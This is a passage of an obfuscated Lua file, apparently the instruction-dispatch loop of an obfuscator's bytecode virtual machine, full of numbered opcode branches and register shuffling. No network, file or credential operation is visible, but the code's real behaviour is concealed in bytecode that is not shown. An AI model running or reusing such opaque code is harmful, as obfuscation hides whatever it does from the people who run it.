c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=271 then local l=o[3];local d=e[l]for o=l+1,o[5]do d=d..e[o];end;e[o[2]]=d;elseif c>272 then e[o[2]]=#e[o[3]];else e[o[2]]();B=A;end;elseif c<=275 then if c>274 then d=d+o[3];else local c;local A;local a,A;local r;f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];r=o[2];a,A={e[r]()};A=r+o[5]-2;c=0;for o=r,A do c=c+1;e[o]=a[c];end;B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=276 then e[o[2]]=C[o[3]];elseif c==277 then e[o[2]]=f[n[o[3]]];else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];end;elseif c<=283 then if c<=280 then if c>279 then local A,A;local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];else local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=281 then local l=o[2];local f=o[5];local o=l+2;local n={e[l](e[l+1],e[o])};for d=1,f do e[o+d]=n[d];end;local l=e[l+3];if l then e[o]=l else d=d+1;end;elseif c>282 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else local C;local c;local f;local a;local A;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];a={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;a[f]=e[o];end;C={e[A](r(a,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=C[f];end;B=c;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+n[o[5]];end;elseif c<=286 then if c<=284 then local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];elseif c>285 then local S;local a;local c;local D;local J;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;S={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=S[c];end;B=a;d=d+1;o=l[d];d=d+o[3];else local J;local c;local A;local D;local a;local f;f=o[2];a=e[o[3]];e[f+1]=a;e[f]=a[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];f=o[2];D={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;D[A]=e[o];end;J={e[f](r(D,1,c-f))};c=f+o[5]-2;A=0;for o=f,c do A=A+1;e[o]=J[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];f=o[2];a=e[o[3]];e[f+1]=a;e[f]=a[n[o[5]]];d=d+1;o=l[d];f=o[2];D={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;D[A]=e[o];end;e[f](r(D,1,c-f));B=f;d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];if not e[o[2]]then d=d+1;else d=d+o[3];end;end;elseif c<=287 then local o=o[2];local n,d=J(e[o]());B=o-1;d=d+o-1;local l=0;for o=o,d do l=l+1;e[o]=n[l];end;B=d;elseif c==288 then e[o[2]]=e[o[3]]/e[o[5]];else local l=o[3];local d=e[l]for o=l+1,o[5]do d=d..e[o];end;e[o[2]]=d;end;elseif c<=310 then if c<=299 then if c<=294 then if c<=291 then if c>290 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else if(n[o[2]]>=e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=292 then local A;local D,A;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do 